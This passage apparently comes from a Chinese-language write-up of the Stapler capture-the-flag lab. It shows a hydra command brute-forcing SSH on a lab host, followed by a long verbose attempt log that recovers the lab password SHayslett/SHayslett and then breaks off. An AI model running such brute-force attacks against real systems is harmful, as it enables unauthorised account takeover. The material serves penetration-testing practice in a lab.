uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 2. 通过ssh暴力破解获取shell
```shell
┌──(root㉿kali)-[/stapler]
└─# hydra -L username.txt -e nsr ssh://192.168.0.150 -vV -o hydra.txt
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-04 09:39:40
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 150 login tries (l:50/p:3), ~10 tries per task
[DATA] attacking ssh://192.168.0.150:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://john@192.168.0.150:22
[INFO] Successful, password authentication is supported by ssh://192.168.0.150:22
[ATTEMPT] target 192.168.0.150 - login "john" - pass "john" - 1 of 150 [child 0] (0/0)
[ATTEMPT] target 192.168.0.150 - login "john" - pass "" - 2 of 150 [child 1] (0/0)
[ATTEMPT] target 192.168.0.150 - login "john" - pass "nhoj" - 3 of 150 [child 2] (0/0)
[ATTEMPT] target 192.168.0.150 - login "elly" - pass "elly" - 4 of 150 [child 3] (0/0)
[ATTEMPT] target 192.168.0.150 - login "elly" - pass "" - 5 of 150 [child 4] (0/0)
[ATTEMPT] target 192.168.0.150 - login "elly" - pass "ylle" - 6 of 150 [child 5] (0/0)
[ATTEMPT] target 192.168.0.150 - login "harry" - pass "harry" - 7 of 150 [child 6] (0/0)
[ATTEMPT] target 192.168.0.150 - login "harry" - pass "" - 8 of 150 [child 7] (0/0)
[ATTEMPT] target 192.168.0.150 - login "harry" - pass "yrrah" - 9 of 150 [child 8] (0/0)
[ATTEMPT] target 192.168.0.150 - login "barry" - pass "barry" - 10 of 150 [child 9] (0/0)
[ATTEMPT] target 192.168.0.150 - login "barry" - pass "" - 11 of 150 [child 10] (0/0)
[ATTEMPT] target 192.168.0.150 - login "barry" - pass "yrrab" - 12 of 150 [child 11] (0/0)
[ATTEMPT] target 192.168.0.150 - login "root" - pass "root" - 13 of 150 [child 12] (0/0)
[ATTEMPT] target 192.168.0.150 - login "root" - pass "" - 14 of 150 [child 13] (0/0)
[ATTEMPT] target 192.168.0.150 - login "root" - pass "toor" - 15 of 150 [child 14] (0/0)
[ATTEMPT] target 192.168.0.150 - login "daemon" - pass "daemon" - 16 of 150 [child 15] (0/0)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Disabled child 12 because of too many errors
[VERBOSE] Disabled child 15 because of too many errors
[ATTEMPT] target 192.168.0.150 - login "daemon" - pass "" - 17 of 152 [child 7] (0/2)
[ATTEMPT] target 192.168.0.150 - login "daemon" - pass "nomead" - 18 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "bin" - pass "bin" - 19 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "bin" - pass "" - 20 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "bin" - pass "nib" - 21 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "sys" - pass "sys" - 22 of 152 [child 2] (0/2)
[ATTEMPT] target 192.168.0.150 - login "sys" - pass "" - 23 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "sync" - pass "sync" - 25 of 152 [child 1] (0/2)
[ATTEMPT] target 192.168.0.150 - login "sync" - pass "" - 26 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 8
[ATTEMPT] target 192.168.0.150 - login "sync" - pass "cnys" - 27 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "games" - pass "games" - 28 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "games" - pass "" - 29 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "games" - pass "semag" - 30 of 152 [child 5] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "games" - pass "" - 30 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 3
[VERBOSE] Retrying connection for child 8
[ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 13
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "games" - 31 of 152 [child 3] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 31 of 152 [child 8] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 13
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 13
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "man" - 31 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 32 of 152 [child 11] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[ATTEMPT] target 192.168.0.150 - login "man" - pass "nam" - 33 of 152 [child 6] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 6
[RE-ATTEMPT] target 192.168.0.150 - login "man" - pass "" - 33 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "lp" - pass "lp" - 34 of 152 [child 0] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.0.150 - login "lp" - pass "nam" - 34 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "lp" - pass "" - 35 of 152 [child 10] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "lp" - pass "pl" - 36 of 152 [child 9] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "lp" - pass "lp" - 36 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "mail" - pass "mail" - 37 of 152 [child 1] (0/2)
[ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 38 of 152 [child 2] (0/2)
[VERBOSE] Retrying connection for child 10
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 1
[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 38 of 152 [child 10] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "mail" - 38 of 152 [child 1] (0/2)
[VERBOSE] Retrying connection for child 10
[ATTEMPT] target 192.168.0.150 - login "mail" - pass "liam" - 39 of 152 [child 7] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "mail" - pass "" - 39 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "news" - pass "news" - 40 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "news" - pass "" - 41 of 152 [child 5] (0/2)
[ATTEMPT] target 192.168.0.150 - login "news" - pass "swen" - 42 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "uucp" - 43 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "" - 44 of 152 [child 4] (0/2)
[VERBOSE] Retrying connection for child 5
[VERBOSE] Retrying connection for child 8
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 3
[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "" - 44 of 152 [child 5] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "swen" - 44 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: disconnected
[ERROR] ssh protocol error
[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "uucp" - 44 of 152 [child 3] (0/2)
[VERBOSE] Retrying connection for child 8
[ATTEMPT] target 192.168.0.150 - login "uucp" - pass "pcuu" - 45 of 152 [child 13] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "uucp" - pass "swen" - 45 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "nobody" - 46 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "" - 47 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "nobody" - pass "ydobon" - 48 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "tim" - pass "tim" - 49 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "tim" - pass "" - 50 of 152 [child 2] (0/2)
[ATTEMPT] target 192.168.0.150 - login "tim" - pass "mit" - 51 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "zoe" - 52 of 152 [child 1] (0/2)
[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "" - 53 of 152 [child 7] (0/2)
[ATTEMPT] target 192.168.0.150 - login "zoe" - pass "eoz" - 54 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "garry" - pass "garry" - 55 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "garry" - pass "" - 56 of 152 [child 5] (0/2)
[ATTEMPT] target 192.168.0.150 - login "garry" - pass "yrrag" - 57 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "scott" - pass "scott" - 58 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "scott" - pass "" - 59 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "scott" - pass "ttocs" - 60 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "kathy" - 61 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "" - 62 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kathy" - pass "yhtak" - 63 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "peter" - pass "peter" - 64 of 152 [child 2] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 2
[ATTEMPT] target 192.168.0.150 - login "peter" - pass "" - 65 of 152 [child 9] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[RE-ATTEMPT] target 192.168.0.150 - login "peter" - pass "peter" - 65 of 152 [child 2] (0/2)
[VERBOSE] Retrying connection for child 9
[ATTEMPT] target 192.168.0.150 - login "peter" - pass "retep" - 66 of 152 [child 1] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "peter" - pass "" - 66 of 152 [child 9] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 9
[ATTEMPT] target 192.168.0.150 - login "heather" - pass "heather" - 67 of 152 [child 14] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 14
[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 67 of 152 [child 9] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 68 of 152 [child 5] (0/2)
[VERBOSE] Retrying connection for child 9
[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "heather" - 68 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "heather" - pass "rehtaeh" - 69 of 152 [child 7] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 7
[RE-ATTEMPT] target 192.168.0.150 - login "heather" - pass "" - 69 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "RNunemaker" - 70 of 152 [child 10] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 10
[RE-ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "rehtaeh" - 70 of 152 [child 7] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "RNunemaker" - 70 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "" - 71 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "RNunemaker" - pass "rekamenuNR" - 72 of 152 [child 3] (0/2)
[VERBOSE] Retrying connection for child 8
[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "ETollefson" - 73 of 152 [child 13] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 8
[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 8
[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 8
[RE-ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 73 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "" - 74 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "ETollefson" - pass "nosfelloTE" - 75 of 152 [child 4] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 4
[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "DSwanger" - 76 of 152 [child 6] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "nosfelloTE" - 76 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "" - 77 of 152 [child 9] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 9
[ATTEMPT] target 192.168.0.150 - login "DSwanger" - pass "regnawSD" - 78 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "AParnell" - 79 of 152 [child 7] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 79 of 152 [child 9] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 9
[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 80 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "llenraPA" - 81 of 152 [child 3] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "AParnell" - pass "" - 81 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "SHayslett" - 82 of 152 [child 0] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "" - 83 of 152 [child 2] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "SHayslett" - 83 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SHayslett" - pass "ttelsyaHS" - 84 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 85 of 152 [child 14] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 14
[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "" - 86 of 152 [child 5] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 86 of 152 [child 14] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 14
[ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "nissaBM" - 87 of 152 [child 1] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "MBassin" - pass "MBassin" - 87 of 152 [child 14] (0/2)
[22][ssh] host: 192.168.0.150   login: SHayslett   password: SHayslett
[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "JBare" - 88 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "" - 89 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JBare" - pass "eraBJ" - 90 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 91 of 152 [child 4] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 4
[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "" - 92 of 152 [child 10] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 92 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "muloSL" - 93 of 152 [child 7] (0/2)
[VERBOSE] Retrying connection for child 10
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 7
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 4
[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "" - 93 of 152 [child 10] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "muloSL" - 93 of 152 [child 7] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "LSolum" - pass "LSolum" - 93 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "IChadwick" - 94 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "" - 95 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "IChadwick" - pass "kciwdahCI" - 96 of 152 [child 9] (0/2)
[VERBOSE] Retrying connection for child 13
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 9
[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "MFrei" - 97 of 152 [child 8] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 97 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "kciwdahCI" - 97 of 152 [child 9] (0/2)
[VERBOSE] Retrying connection for child 13
[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "" - 98 of 152 [child 2] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 98 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 13
[ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "ierFM" - 99 of 152 [child 5] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 5
[RE-ATTEMPT] target 192.168.0.150 - login "MFrei" - pass "IChadwick" - 99 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "SStroud" - 100 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "" - 101 of 152 [child 1] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "ierFM" - 101 of 152 [child 5] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 5
[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "ierFM" - 101 of 152 [child 5] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "duortSS" - 102 of 152 [child 11] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[RE-ATTEMPT] target 192.168.0.150 - login "SStroud" - pass "duortSS" - 102 of 152 [child 11] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "CCeaser" - 103 of 152 [child 0] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 0
[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "duortSS" - 103 of 152 [child 11] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 11
[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "CCeaser" - 103 of 152 [child 0] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "duortSS" - 103 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "" - 104 of 152 [child 6] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 6
[RE-ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "" - 104 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "CCeaser" - pass "resaeCC" - 105 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "JKanode" - 106 of 152 [child 7] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 7
[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "" - 107 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "edonaKJ" - 108 of 152 [child 4] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "JKanode" - pass "JKanode" - 108 of 152 [child 7] (0/2)
[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "CJoo" - 109 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "" - 110 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "CJoo" - pass "ooJC" - 111 of 152 [child 2] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "Eeth" - 112 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "" - 113 of 152 [child 1] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Eeth" - pass "hteE" - 114 of 152 [child 14] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 14
[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "LSolum2" - 115 of 152 [child 5] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "hteE" - 115 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "" - 116 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "LSolum2" - pass "2muloSL" - 117 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "JLipps" - 118 of 152 [child 6] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 6
[RE-ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "JLipps" - 118 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "" - 119 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "JLipps" - pass "sppiLJ" - 120 of 152 [child 4] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 4
[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "jamie" - 121 of 152 [child 7] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 7
[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "" - 122 of 152 [child 3] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "sppiLJ" - 122 of 152 [child 4] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 3
[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "jamie" - 122 of 152 [child 7] (0/2)
[ATTEMPT] target 192.168.0.150 - login "jamie" - pass "eimaj" - 123 of 152 [child 8] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "jamie" - pass "" - 123 of 152 [child 3] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "Sam" - 124 of 152 [child 9] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "" - 125 of 152 [child 13] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "Sam" - pass "maS" - 126 of 152 [child 2] (0/2)
[VERBOSE] Retrying connection for child 13
[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "Drew" - 127 of 152 [child 1] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "Drew" - pass "" - 127 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "" - 128 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Drew" - pass "werD" - 129 of 152 [child 5] (0/2)
[ATTEMPT] target 192.168.0.150 - login "jess" - pass "jess" - 130 of 152 [child 0] (0/2)
[ATTEMPT] target 192.168.0.150 - login "jess" - pass "" - 131 of 152 [child 11] (0/2)
[ATTEMPT] target 192.168.0.150 - login "jess" - pass "ssej" - 132 of 152 [child 6] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 6
[RE-ATTEMPT] target 192.168.0.150 - login "jess" - pass "ssej" - 132 of 152 [child 6] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "SHAY" - 133 of 152 [child 10] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "" - 134 of 152 [child 4] (0/2)
[ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "YAHS" - 135 of 152 [child 7] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 7
[RE-ATTEMPT] target 192.168.0.150 - login "SHAY" - pass "YAHS" - 135 of 152 [child 7] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "Taylor" - 136 of 152 [child 2] (0/2)
[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "" - 137 of 152 [child 8] (0/2)
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[ATTEMPT] target 192.168.0.150 - login "Taylor" - pass "rolyaT" - 138 of 152 [child 5] (0/2)
[VERBOSE] Retrying connection for child 8
[ERROR] could not connect to target port 22: Socket error: Connection reset by peer
[ERROR] ssh protocol error
[VERBOSE] Retrying connection for child 5
[ATTEMPT] target 192.168.0.150 - login "mel" - pass "mel" - 139 of 152 [child 1] (0/2)
[RE-ATTEMPT] target 192.168.0.150 - login "mel" - pass "" - 139 of 152 [child 8] (0/2)
[ATTEMPT] target 192.168.0.150 - login "mel" - pass "" - 140 of 152 [child 13] (0/2)
[ATTEMPT] target 192.168.0.150 - login "mel" - pass "lem" - 141 of 152 [child 14] (0/2)
[ATTEMPT] target 192.168.0.150 - login "kai" - pass "kai" - 142 of 152 [child 3] (0/2)
